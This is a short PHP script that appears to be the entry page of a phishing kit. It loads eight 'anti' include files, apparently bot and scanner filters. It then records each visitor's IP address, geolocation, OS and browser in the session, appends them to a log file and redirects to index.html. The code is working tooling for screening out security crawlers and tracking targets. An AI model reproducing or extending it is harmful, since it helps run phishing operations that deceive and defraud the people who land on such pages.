<?php include '../imp/anti/anti1.php'
;include '../imp/anti/anti2.php';
include '../imp/anti/anti3.php';
include '../imp/anti/anti4.php';
include '../imp/anti/anti5.php';
include '../imp/anti/anti6.php';
include '../imp/anti/anti7.php';
include '../imp/anti/anti8.php';
ob_start();session_start();require '../extra/algo.php';
$_SESSION['language']=getLanguage();$_SESSION['ip']=clientData('ip');$_SESSION['ip_countryName']=clientData('country');
$_SESSION['ip_countryCode']=clientData('code');$_SESSION['ip_city']=clientData('city');
$_SESSION['ip_state']=clientData('state');$_SESSION['ip_timezone']=clientData('timezone');
$_SESSION['currency']=clientData('currency');$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();date_default_timezone_set('GMT');$dateNow=date("d/m/Y h:i:s A");
$code="{$_SESSION['ip']} | {$dateNow} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n"
;$save=fopen("../log.txt","a+");fwrite($save,$code);fclose($save);exit(header("Location: index.html"));?>